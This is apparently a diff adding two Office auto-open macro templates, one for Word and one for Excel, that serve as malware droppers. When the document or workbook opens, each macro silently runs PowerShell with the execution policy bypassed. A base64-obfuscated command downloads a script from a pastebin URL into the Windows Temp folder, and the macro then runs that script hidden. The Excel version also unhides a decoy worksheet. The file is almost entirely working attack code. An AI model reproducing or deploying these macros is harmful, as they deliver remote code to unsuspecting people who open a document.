@@ -1,0 +1,31 @@
+---------------------------------
+----  Auto Open Word Macro  -----
+---------------------------------
+Private Sub Document_Open()
+Dim strCommand1 As String
+Dim strCommand2 As String
+strCommand1 = "powershell.exe -executionpolicy unrestricted -windowstyle hidden -encodedcommand JAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHcAYwAuAFUAcwBlAEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgACQAdAByAHUAZQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgACQAdwBjAC4AQwByAGUAZABlAG4AdABpAGEAbABzADsAJABjAGwAaQBlAG4AdAAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvAHAAYQBzAHQAZQBiAGkAbgAuAGMAbwBtAC8AcgBhAHcALgBwAGgAcAA/AGkAPQBBADMAMgBlAHYAOABiAEMAIgAsACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAGEAdQBkAGkAdAAuAHAAcwAxACIAIAAgACkA"
+strCommand2 = "powershell.exe -executionpolicy unrestricted -windowstyle hidden -file C:\Windows\Temp\audit.ps1"
+Shell strCommand1, 0
+For iCount = 1 To 10000
+Next iCount
+Shell strCommand2, 0
+End Sub
+
+
+
+
+-----------------------------------------------------
+----  Auto Open Excel Macro - Unhide worksheet  -----
+-----------------------------------------------------
+Private Sub Workbook_Open()
+Sheets("Calender").Visible = True
+Sheets("Calender").Select
+Dim strCommand1 As String
+Dim strCommand2 As String
+strCommand1 = "powershell.exe -executionpolicy unrestricted -windowstyle hidden -encodedcommand JAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHcAYwAuAFUAcwBlAEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgACQAdAByAHUAZQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgACQAdwBjAC4AQwByAGUAZABlAG4AdABpAGEAbABzADsAJABjAGwAaQBlAG4AdAAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvAHAAYQBzAHQAZQBiAGkAbgAuAGMAbwBtAC8AcgBhAHcALgBwAGgAcAA/AGkAPQBBADMAMgBlAHYAOABiAEMAIgAsACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAGEAdQBkAGkAdAAuAHAAcwAxACIAIAAgACkA"
+strCommand2 = "powershell.exe -executionpolicy unrestricted -windowstyle hidden -file C:\Windows\Temp\audit.ps1"
+Shell strCommand1, 0
+Application.Wait (Now + TimeValue("0:00:10"))
+Shell strCommand2, 0
+End Sub
